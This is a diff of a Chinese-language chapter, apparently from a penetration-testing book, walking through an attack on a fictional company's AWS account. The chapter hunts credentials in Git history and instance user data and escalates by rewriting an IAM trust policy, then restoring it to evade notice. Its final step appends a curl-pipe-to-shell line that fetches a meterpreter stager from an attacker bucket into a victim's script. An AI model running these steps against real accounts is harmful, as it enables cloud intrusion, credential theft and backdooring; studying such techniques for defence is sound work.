@@ -1,6 +1,4 @@
-# 10
-
-内在的敌人
+# 内在的敌人
 
 ![](img/chapterart.png)
 
@@ -11,7 +9,7 @@
 我们加载了从 Kube 获取的 AWS 访问密钥，并检查了一个随机用户的权限。例如，第八章中的 Kevin 就是一个很好的目标：
 
 ```
-root@Point1:~/# **aws iam get-user --profile kevin**
+root@Point1:~/# aws iam get-user --profile kevin
 "User": {
    "UserName": "kevin.duncan",
 `--snip--`
@@ -22,7 +20,7 @@ root@Point1:~/# **aws iam get-user --profile kevin**
 为了限制这些权限的范围，管理员通常会添加条件，要求 IAM API 调用仅针对调用用户。例如，Kevin 可能被允许列出自己的权限，但不能列出其他用户的权限：
 
 ```
-root@Point1:~/# **aws iam list-attached-user-policies \**
+root@Point1:~/# aws iam list-attached-user-policies \
 **--user-name=kevin.duncan \**
 **--profile kevin**
 
@@ -34,7 +32,7 @@ root@Point1:~/# **aws iam list-attached-user-policies \**
 确实，当我们对 Kevin 以外的资源调用 IAM 命令时，就会出现错误，情况如下：
 
 ```
-root@Point1:~/# **aws iam get-policy \**
+root@Point1:~/# aws iam get-policy \
 **--policy-arn mxrads-self-manage \**
 **--profile kevin**
 
@@ -51,11 +49,11 @@ AWS 在访问权限方面严格把控。幸运的是，Kevin 的策略名称足�
 幸运的是，AWS 有一个有用的 API，跨多个资源类型和服务，适用于给定的区域：资源组标记 API。只要对象拥有标签或标识符，该 API 就会返回 S3 存储桶、VPC 终端节点、数据库等。任何具有最基本基础设施管理的公司都会确保对其资源进行标记，哪怕只是为了计费目的，因此我们可以相当有信心这个 API 返回的结果是准确且全面的。我们首先列出*eu-west-1*区域的资源，如列表 10-1 所示。
 
 ```
-root@Point1:~/# **aws resourcegroupstaggingapi get-resources \**
+root@Point1:~/# aws resourcegroupstaggingapi get-resources \
 **--region eu-west-1 \**
 **--profile kevin > tagged_resources_euw1.txt**
 
-root@Point1:~/# **head tagged_resources_euw1.txt**
+root@Point1:~/# head tagged_resources_euw1.txt
 
 ResourceARN: arn:aws:ec2:eu-west-1:886371554408:vpc/vpc-01e638,
 Tags: [ "Key": "Name", "Value": "privateVPC"]
@@ -74,7 +72,7 @@ arn:aws:dynamodb:eu-west-1:886371554408:table/cruise_case
 从列表 10-1 中，我们从 MXR Ads 的账户中提取了超过 8,000 个标记资源，因此我们自然会转向我们信赖的`grep`命令来查找有关 GP 的引用：
 
 ```
-root@Point1:~/# **egrep -i "gretsch|politico|gpoli" tagged_resources_euw1.txt**
+root@Point1:~/# egrep -i "gretsch|politico|gpoli" tagged_resources_euw1.txt
 
 ResourceARN: arn:aws:lambda:eu-west-1:886477354405:function:dmp-sync-gretsch-politico,
 `--snip--`
@@ -87,7 +85,7 @@ ResourceARN: arn:aws:lambda:eu-west-1:886477354405:function:dmp-sync-gretsch-pol
 让我们仔细看一下这个`dmp-sync` Lambda 函数（参见列表 10-2）。
 
 ```
-root@Point1:~/# **aws lambda get-function  \**
+root@Point1:~/# aws lambda get-function  \
 **--function-name dmp-sync-gretsch-politico \**
 **--region eu-west-1 \**
 **--profile kevin**
@@ -102,7 +100,7 @@ Location: https://mxrads-lambdas.s3.eu-west-1.amazonaws.com/functions/dmp-sync-g
 我们在列表 10-2 中看到，Lambda 函数从 S3 路径*mxrads-lambdas/dmp-sync-gp*中获取它需要执行的编译代码。我们立刻冲向键盘，开始输入下一个命令：
 
 ```
-root@Point1:~/# **aws s3api get-object \**
+root@Point1:~/# aws s3api get-object \
 **--bucket mxrads-lambdas \**
 **--key functions/dmp-sync-gp dmp-sync-gp \**
 **--profile kevin**
@@ -116,7 +114,7 @@ Access Denied
 相反，我们更仔细地查看 Lambda 定义，发现它模拟了 AWS 角色`lambda-dmp-sync`，并依赖几个环境变量来执行其任务（参见清单 10-3）。
 
 ```
-root@Point1:~/# **aws lambda get-function \**
+root@Point1:~/# aws lambda get-function \
 **--function-name dmp-sync-gretsch-politico \**
 **--region eu-west-1 \**
 **--profile kevin**
@@ -147,11 +145,11 @@ AWS 确实提供了一种通过 STS API 模拟任何角色的自然方式，但�
 让我们检查一下 EC2 服务，并描述所有运行的实例（参见清单 10-4）。还记得我们在第八章尝试时，受限于 Kubernetes 节点吗？感谢 Kevin 的广泛只读权限，这些限制已经被解除。
 
 ```
-root@Point1:~/# **aws ec2 describe-instances \**
+root@Point1:~/# aws ec2 describe-instances \
 **--region=eu-west-1 \**
 **--profile kevin > all_instances_euw1.txt**
 
-root@Point1:~/# **head all_instances_euw1.txt**
+root@Point1:~/# head all_instances_euw1.txt
 --`snip`--
 "InstanceId": "i-09072954011e63aer",
 "InstanceType": "c5.4xlarge",
@@ -181,7 +179,7 @@ root@Point1:~/# **head all_instances_euw1.txt**
 Terraform 帮助追踪在 AWS 上运行的组件，Ansible 配置服务器并安装所需的软件包，Rundeck 在数据库之间调度维护任务，而 Jenkins 则构建应用程序并将其部署到生产环境中。随着公司规模的扩大，它需要一套稳固的工具和标准来支持和推动这种增长。我们正在浏览运行机器的列表，寻找工具名称：
 
 ```
-root@Point1:~/# **egrep -i -1 \**
+root@Point1:~/# egrep -i -1 \
 **"jenkins|rundeck|chef|terraform|puppet|circle|travis|graphite" all_instances_euw1.txt**
 
 "InstanceId": "i-09072954011e63aer",
@@ -272,8 +270,8 @@ for repo in g.get_user().get_repos():
 然后我们搜索 *cookbook*、*Jenkins*、*Chef*、*recipe* 等关键字的引用（见 列表 10-6）。
 
 ```
-root@Point1:~/# **python3 list_repos.py > list_repos.txt**
-root@Point1:~/# **egrep -i "cookbook|jenkins|chef" list_repos.txt**
+root@Point1:~/# python3 list_repos.py > list_repos.txt
+root@Point1:~/# egrep -i "cookbook|jenkins|chef" list_repos.txt
 cookbook-generator https://github.com/mxrads/cookbook-generator.git
 cookbook-mxrads-ami https://github.com/mxrads/cookbook-ami.git
 1 cookbook-mxrads-jenkins-ci https://github.com/mxrads/cookbook-jenkins-ci.git
@@ -285,13 +283,13 @@ cookbook-mxrads-ami https://github.com/mxrads/cookbook-ami.git
 命中 1！我们下载了 cookbook-mxrads-jenkins-ci 仓库：
 
 ```
-root@Point1:~/# **git clone https://github.com/mxrads/cookbook-jenkins-ci.git**
+root@Point1:~/# git clone https://github.com/mxrads/cookbook-jenkins-ci.git
 ```
 
 然后我们通过源代码，希望找到一些硬编码的凭据：
 
 ```
-root@Point1:~/# **egrep -i "password|secret|token|key" cookbook-jenkins-ci**
+root@Point1:~/# egrep -i "password|secret|token|key" cookbook-jenkins-ci
 
 default['jenkins']['keys']['operations_redshift_rw_password'] = 'AQICAHhKmtEfZEcJQ9X...'
 default['jenkins']['keys']['operations_aws_access_key_id'] = 'AQICAHhKmtEfZEcJQ9X...'
@@ -313,7 +311,7 @@ Let's say your credentials are in /path/to/credentials...
 我最喜欢的那个句子中的关键字是“现在”。这表明不久前，密钥的处理方式可能与现在不同，可能根本没有加密。我们查看了 Git 提交历史：
 
 ```
-root@Point1:~/# **git rev-list --all | xargs git grep "aws_secret"**
+root@Point1:~/# git rev-list --all | xargs git grep "aws_secret"
 
 e365cd828298d55...:secrets.rb:
 default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZEcJQ9X1w...'
@@ -337,7 +335,7 @@ default['jenkins']['keys']['operations_aws_secret_access_key'] = 'AQICAHhKmtEfZE
 我们将这些服务名称作为关键字存储在文件中，然后将它们输入到一个循环中，从中获取带有匹配关键字标签名称的实例，如下所示。我们提取每个机器池中每个服务的第一个实例 ID，因为例如，所有 Cassandra 机器可能共享相同的用户数据，所以我们只需要一个实例：
 
 ```
-root@Point1:~/# **while read p; do**
+root@Point1:~/# while read p; do
  **instanceID=$(aws ec2 describe-instances \**
  **--filter "Name=tag:Name,Values=*$p*" \**
  **--query 'Reservations[0].Instances[].InstanceId' \**
@@ -350,7 +348,7 @@ root@Point1:~/# **while read p; do**
 这种相对临时的采样方法让我们得到了大约 20 个实例 ID，每个 ID 对应一台承载不同服务的机器：
 
 ```
-root@Point1:~/# **head list_ids.txt**
+root@Point1:~/# head list_ids.txt
 i-08072939411515dac
 i-080746959025ceae
 i-91263120217ecdef
@@ -360,7 +358,7 @@ i-91263120217ecdef
 我们循环遍历这个文件，调用`ec2 describe-instance-attribute` API 来获取用户数据，解码并将其存储到文件中：
 
 ```
-root@Point1:~/# **while read p; do**
+root@Point1:~/# while read p; do
  **userData=$(aws ec2 describe-instance-attribute \**
  **--instance-id $p \**
  **--attribute userData \**
@@ -373,9 +371,9 @@ root@Point1:~/# **while read p; do**
 我们检查创建了多少个文件，并确认这些文件包含用户数据脚本：
 
 ```
-root@Point1:~/# **ls -l i-*.txt |wc -l**
+root@Point1:~/# ls -l i-*.txt |wc -l
 21
-root@Point1:~/# **cat i-08072939411515dac.txt**
+root@Point1:~/# cat i-08072939411515dac.txt
 encoding: gzip+base64
   path: /etc/ssh/auth_principals/user
   permissions: "0644"
@@ -387,7 +385,7 @@ encoding: gzip+base64
 完美。现在到了关键时刻。这些出色的服务器中有哪一台在其用户数据中声明了 Chef 私钥？我们寻找“RSA PRIVATE KEY”关键字：
 
 ```
-root@Point1:~/# **grep -7 "BEGIN RSA PRIVATE KEY" i-*.txt**
+root@Point1:~/# grep -7 "BEGIN RSA PRIVATE KEY" i-*.txt
 `--snip--`
 1 cat << EOF
 chef_server_url 'https://chef.mxrads.net/organizations/mxrads'
@@ -502,17 +500,17 @@ meterpreter > **curl https://chef.mxrads.net:443/bookshelf/org...**
 在列表 10-7 中，我们通过链式调用几个 AWS API 来获取与这些凭证关联的 IAM 用户名、其附加的策略、最新版本，最后是它们的内容。
 
 ```
-root@Point1:~/# **vi ~/.aws/credentials**
+root@Point1:~/# vi ~/.aws/credentials
 [jenkins]
 aws_access_key_id = AKIA55ZRK6ZS2XX5QQ4D
 aws_secret_access_key = 6yHF+L8+u7g7RmHcudlCqWIg0SchgT
 
 # get username
-root@Point1:~/# **aws iam get-user --profile jenkins**
+root@Point1:~/# aws iam get-user --profile jenkins
 "UserName": "jenkins"
 
 # list attached policies
-root@Point1:~/# **aws iam list-attached-user-policies \**
+root@Point1:~/# aws iam list-attached-user-policies \
 **--user-name=jenkins \**
 **--profile jenkins**
 
@@ -520,7 +518,7 @@ root@Point1:~/# **aws iam list-attached-user-policies \**
 "PolicyArn": "arn:aws:iam::aws:policy/jenkins-policy"
 
 # get policy version
-root@Point1:~/# **aws iam iam get-policy \**
+root@Point1:~/# aws iam iam get-policy \
 **--policy-arn arn:aws:iam::886371554408:policy/jenkins-policy \**
 **--profile jenkins**
 
@@ -528,7 +526,7 @@ root@Point1:~/# **aws iam iam get-policy \**
 
 # get policy content
 
-root@Point1:~/# **aws iam iam get-policy-version \**
+root@Point1:~/# aws iam iam get-policy-version \
 **--policy-arn arn:aws:iam::886371554408:policy/jenkins-policy \**
 **--version v4 \**
 **--profile jenkins**
@@ -555,8 +553,8 @@ root@Point1:~/# **aws iam iam get-policy-version \**
 现在我们拥有了对 IAM 服务的无限访问权限，让我们来探索这个 Lambda 的角色（见列表 10-8）。
 
 ```
-root@Point1:~/# **export AWS_PROFILE=jenkins**
-root@Point1:~/# **aws iam get-role lambda-dmp-sync**
+root@Point1:~/# export AWS_PROFILE=jenkins
+root@Point1:~/# aws iam get-role lambda-dmp-sync
  "RoleName": "dmp-sync",
  "Arn": "arn:aws:iam::886371554408:role/dmp-sync",
  "AssumeRolePolicyDocument": {
@@ -598,11 +596,11 @@ root@Point1:~/# **aws iam get-role lambda-dmp-sync**
 我们提交这个新角色策略，并迅速发出`assume-role` API 调用，获取临时凭证来假扮`lambda-dmp-sync`角色：
 
 ```
- root@Point1:~/# **aws iam update-assume-role-policy \**
+ root@Point1:~/# aws iam update-assume-role-policy \
 **--role-name lambda-dmp-sync \**
 **--policy-document file://new_policy.json**
 
-root@Point1:~/# **aws sts assume-role \**
+root@Point1:~/# aws sts assume-role \
 **--role-arn arn:aws:iam::886371554408:user/lambda-dmp-sync \**
 **--role-session-name AWSCLI-Session \**
 **--duration-seconds 43200**
@@ -616,7 +614,7 @@ root@Point1:~/# **aws sts assume-role \**
 好的。这些临时凭证将在 12 小时内有效，即使 Jenkins 不再在信任策略中。最后，我们恢复原始策略，以避免任何怀疑：
 
 ```
-root@Point1:~/# **aws iam update-assume-role-policy \**
+root@Point1:~/# aws iam update-assume-role-policy \
 **--role-name lambda-dmp-sync \**
 **--policy-document file://old_policy.json\**
 **--profile jenkins**
@@ -625,17 +623,17 @@ root@Point1:~/# **aws iam update-assume-role-policy \**
 我们将新密钥加载到 AWS CLI 中，继续探索 Gretsch Politico 的桶 gretsch-streaming-jobs（列表 10-10）。这就是前面章节中提到的`dmp-sync` Lambda 使用的桶。
 
 ```
-root@Point1:~/# **vi ~/.aws/credentials**
+root@Point1:~/# vi ~/.aws/credentials
 [dmp-sync]
 aws_access_key_id = ASIA44ZRK6WSZAFXRBQF
 aws_secret_access_key = nSiNoOEnWIm8h3WKXqgRG+mRu2QVN0moBSTjRZWC
 aws_session_token = FwoGZXIvYXdzEL//...
 
-root@Point1:~/# **aws s3api list-objects-v2 \**
+root@Point1:~/# aws s3api list-objects-v2 \
 **--bucket gretsch-streaming-jobs \**
 **--profile dmp-sync > list_objects_gp.txt**
 
-root@Point1:~/# **head list_objects_gp.txt**
+root@Point1:~/# head list_objects_gp.txt
 
 "Key": "rtb-bid-resp/2019/12/11/10/resp-0-141d08-ecedade-123...",
 "Key": "rtb-bid-resp/2019/12/11/10/resp-0-753a10-3e1a3cb-51c...",
@@ -665,7 +663,7 @@ gretsch-streaming-jobs 存储桶真的是巨大的。它包含了数以 TB 计�
 有趣。在这里，我们发现了一些可执行对象，很可能在 GP 拥有并操作的机器上执行。这可能正是我们进入 Gretsch Politico 的 AWS 账户的钥匙。根据定义，我们的 Lambda 角色可以写入 gretsch-streaming-jobs 存储桶。问题是，GP 是否足够聪明，只将 Lambda 限制在`rtb-bid-resp`子键上？让我们来测试一下：
 
 ```
-root@Point1:~/# **aws s3api put-object \**
+root@Point1:~/# aws s3api put-object \
 **--bucket gretsch-streaming-jobs \**
 **--key helpers/test.html --body test.html \**
 **--profile dmp-sync**
@@ -678,14 +676,14 @@ root@Point1:~/# **aws s3api put-object \**
 我们下载*helpers/ecr-login.sh*，附加一个命令来执行我们的自定义 meterpreter stager，然后重新提交该文件。像往常一样，这个 stager 将托管在我们自己 AWS 账户中的另一个假存储桶 gretsch-helpers 中：
 
 ```
-root@Point1:~/# **aws s3api get-object \**
+root@Point1:~/# aws s3api get-object \
 **--bucket gretsch-streaming-jobs\**
 **--key helpers/ecr_login.sh ecr-login.sh \**
 **--profile dmp-sync**
 
-root@Point1:~/# **echo "true || curl https://gretsch-helpers.s3.amazonaws.com/helper.sh |sh" >> ecr-login.sh**
+root@Point1:~/# echo "true || curl https://gretsch-helpers.s3.amazonaws.com/helper.sh |sh" >> ecr-login.sh
 
-root@Point1:~/# **aws s3api put-object \**
+root@Point1:~/# aws s3api put-object \
 **--bucket gretsch-streaming-jobs \**
 **--key helpers/ecr-login.sh \**
 **--body ecr-login.sh \**
